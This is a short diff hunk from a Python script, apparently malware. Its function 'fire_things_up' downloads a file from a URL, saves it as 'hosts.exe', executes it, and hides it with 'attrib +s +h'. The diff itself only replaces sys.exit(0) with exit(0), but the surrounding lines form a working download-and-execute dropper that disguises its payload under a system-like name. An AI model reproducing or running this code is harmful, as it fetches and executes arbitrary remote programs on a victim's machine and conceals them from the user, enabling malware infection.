@@ -14,9 +14,9 @@ def fire_things_up(url,arch="No"):
             x = urlretrieve(url,"hosts.exe")
             xx = popen("hosts.exe")
             xxx = popen("attrib +s +h hosts.exe")
-            sys.exit(0)
+            exit(0)
     else:
         x = urlretrieve(url,"hosts.exe")
         xx = popen("hosts.exe")
         xxx = popen("attrib +s +h hosts.exe") #hiding the file
-        sys.exit(0)
+        exit(0)
